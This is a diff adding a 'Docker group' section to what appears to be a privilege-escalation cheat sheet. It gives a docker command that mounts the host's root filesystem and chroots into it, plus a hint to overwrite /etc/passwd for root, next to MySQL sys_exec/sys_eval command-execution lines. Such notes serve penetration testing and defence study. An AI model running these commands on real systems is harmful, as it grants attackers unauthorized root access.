@@ -156,3 +156,13 @@ select sys_exec('echo test>/tmp/test.txt');
 select sys_eval('echo test>/tmp/test.txt');
 
 ````
+
+## Docker group 
+```
+#https://medium.com/@Affix/privilege-escallation-with-docker-56dc682a6e17
+docker run -it --volume /:/mnt alpine:latest chroot /mnt
+
+Overwite etc/passwd inside docker to gain root 
+````
+
+
